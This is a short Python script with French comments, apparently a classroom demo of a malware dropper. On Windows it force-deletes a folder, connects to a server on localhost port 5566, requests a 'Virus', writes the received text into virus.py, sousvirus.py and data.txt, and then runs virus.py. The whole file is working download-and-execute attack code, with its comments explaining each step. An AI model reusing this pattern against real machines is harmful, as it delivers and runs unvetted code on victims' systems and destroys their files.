import socket
import os
#Vérification de l'os utilisé 
if os.name == "nt":#Il s'agit de Windows

    #La premiere etape consiste a nettoyer l'emplacement ou les fichier vont etre telecharger pour eviter tout probleme
    #(On peut potentiellement eviter cette etape)
    os.system("rmdir script2 /s /q")
    os.system("echo ETAPE 1 FIN") 

    #La deuxieme etape consiste a se connecter au serveur
    #Ici on utilise un socket en python car c'est plus simple pour une demo
    host, port = ('localhost',5566)
    socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    socket.connect((host,port))
    
    #On est connecté 
    print("Client connecté !")

    #On envoie une requete au serveur
    socket.sendall("Virus".encode("utf8"))

    #Qui nous renvoie le code du virus qu'on "telecharge"
    #(Ici encore une fois pour simplifier la demo on envoie juste du texte qu'on ecrit dans les fichier pour faire le virus)
    data = socket.recv(2048).decode("utf8")
    liste = data.split("[|]")
    fic = open("virus.py","w")
    fic.write(liste[0])
    fic.close()
    fic = open("sousvirus.py","w")
    fic.write(liste[1])
    fic.close()
    fic = open("data.txt","w")
    fic.write(liste[2])
    fic.close()

    #A voir comment on gere la deconnection/rester connecter 
    socket.close()

    #On execute le virus
    os.system("python virus.py")
    os.system("echo ETAPE 3 FIN") 